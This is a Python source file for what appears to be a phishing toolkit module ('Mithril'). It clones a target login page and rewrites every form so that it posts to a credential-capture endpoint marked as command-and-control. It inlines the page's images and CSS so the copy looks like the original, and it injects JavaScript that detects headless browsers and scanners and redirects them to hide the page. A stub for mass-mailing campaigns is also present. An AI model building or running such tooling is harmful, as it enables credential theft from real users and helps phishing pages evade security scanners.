"""DRAKBEN Social Engineering - Phishing Generator (Mithril)
Author: @drak_ben
Description: Clones websites and generates weaponized landing pages.
"""

import base64
import logging
import os
import secrets
import string
from urllib.parse import urljoin

import requests
import urllib3
from bs4 import BeautifulSoup

# OpSec: Suppress noisy SSL warnings when cloning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)


# =============================================================================
# HYPER-MITHRIL ENGINE (2026)
# =============================================================================


class AntiBotEngine:
    """Generates evasive JavaScript to filter security scanners and bots."""

    @staticmethod
    def generate_js_guard() -> str:
        """Returns obfuscated JavaScript that checks for specialized bot signatures."""
        v_bot = "".join(secrets.choice(string.ascii_letters) for _ in range(8))

        return f"""
        (function() {{
            var {v_bot} = false;

            // 1. Headless Browser Check
            if (navigator.webdriver || window._phantom || window.callPhantom) {{ {v_bot} = true; }}

            // 2. Resolution Check (Scanners often use 800x600 or 0x0)
            if (window.outerWidth < 100 || window.outerHeight < 100) {{ {v_bot} = true; }}

            // 3. Acceleration Check (VMs often lack WebGL)
            try {{
                var canvas = document.createElement('canvas');
                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) {{ {v_bot} = true; }}
            }} catch(e) {{}}

            // 4. Linguistics Check (Bots often set empty languages)
            if (!navigator.languages || navigator.languages.length === 0) {{ {v_bot} = true; }}

            if ({v_bot}) {{
                // Cloak: Redirect to benign site
                window.location.href = "https://www.google.com";
                return;
            }}

            console.log("Human verification passed.");
        }})();
        """


class ShadowCloner:
    """Creates high-fidelity 'Single-File' phishing snapshots.
    Embeds critical assets (CSS/Images) directly into HTML (Base64) to prevent
    broken UI when viewed offline or on restricted networks.
    """

    def compress_and_embed(self, soup: BeautifulSoup, base_url: str) -> None:
        """Converts external resources to Base64 data URIs."""
        # 1. Images
        for img in soup.find_all("img"):
            src = img.get("src")
            if src and not src.startswith("data:"):
                abs_url = urljoin(base_url, src)
                b64_data = self._download_as_b64(abs_url)
                if b64_data:
                    img["src"] = b64_data

        # 2. CSS (Basic support)
        for link in soup.find_all("link", rel="stylesheet"):
            href = link.get("href")
            if href:
                abs_url = urljoin(base_url, href)
                css_content = self._fetch_text(abs_url)
                if css_content:
                    # Replace <link> with <style>
                    new_style = soup.new_tag("style")
                    new_style.string = css_content
                    link.replace_with(new_style)

    def _download_as_b64(self, url: str) -> str:
        try:
            resp = requests.get(url, timeout=5, verify=True)
            if resp.status_code == 200:
                ct = resp.headers.get("Content-Type", "image/png")
                encoded = base64.b64encode(resp.content).decode("utf-8")
                return f"data:{ct};base64,{encoded}"
        except Exception as e:
            logger.debug("Failed to fetch image: %s", e)
        return ""

    def _fetch_text(self, url: str) -> str:
        try:
            resp = requests.get(url, timeout=5, verify=True)
            return resp.text if resp.status_code == 200 else ""
        except Exception:
            return ""


class PhishingGenerator:
    """Mithril Engine: Web Cloner & Trap Generator (Advanced)."""

    def __init__(self, output_dir: str = "custom_tools/phishing_sites") -> None:
        self.output_dir = output_dir
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        self.cloner = ShadowCloner()
        self.antibot = AntiBotEngine()
        logger.info("Mithril Engine (Hyper-Cloner) initialized")

    def clone_site(self, url: str, folder_name: str = "cloned_site") -> str:
        """Clone a login page, embed assets, and inject anti-bot guards."""
        logger.info("Hyper-Cloning site: %s", url)
        target_dir = os.path.join(self.output_dir, folder_name)
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        try:
            # OpSec: Use realistic modern User-Agent
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            }
            response = requests.get(
                url,
                headers=headers,
                timeout=15,
                verify=True,
            )

            if response.status_code != 200:
                logger.error("Failed to fetch site: %s", response.status_code)
                return ""

            soup = BeautifulSoup(response.text, "html.parser")

            # 1. Weaponize Forms
            for form in soup.find_all("form"):
                form["action"] = "/api/capture"  # Drakben C2 Endpoint
                form["method"] = "POST"
                # Add hidden tracking ID
                req_id = "".join(
                    secrets.choice(string.ascii_uppercase + string.digits)
                    for _ in range(16)
                )
                input_tag = soup.new_tag(
                    "input",
                    attrs={"type": "hidden", "name": "req_id", "value": req_id},
                )
                form.append(input_tag)

            # 2. Shadow Clone (Embed Assets)
            logger.info("embedding assets (Shadow Clone mode)...")
            self.cloner.compress_and_embed(soup, url)

            # 3. Inject Anti-Bot Guard
            guard_script = self.antibot.generate_js_guard()
            script_tag = soup.new_tag("script")
            script_tag.string = guard_script
            if soup.head:
                soup.head.insert(0, script_tag)
            else:
                soup.insert(0, script_tag)

            # Save
            index_path = os.path.join(target_dir, "index.html")
            with open(index_path, "w", encoding="utf-8") as f:
                f.write(str(soup))

            logger.info("Site cloned & weaponized successfully: %s", index_path)
            return index_path

        except Exception as e:
            logger.exception("Cloning failed: %s", e)
            return ""

    def _fix_asset_links(self, soup: BeautifulSoup, base_url: str) -> None:
        """Deprecated in favor of ShadowCloner."""

    def generate_campaign(self, target_list, template_name: str) -> None:
        """Launch a mass mailing campaign."""
        # Placeholder for SMTP integration
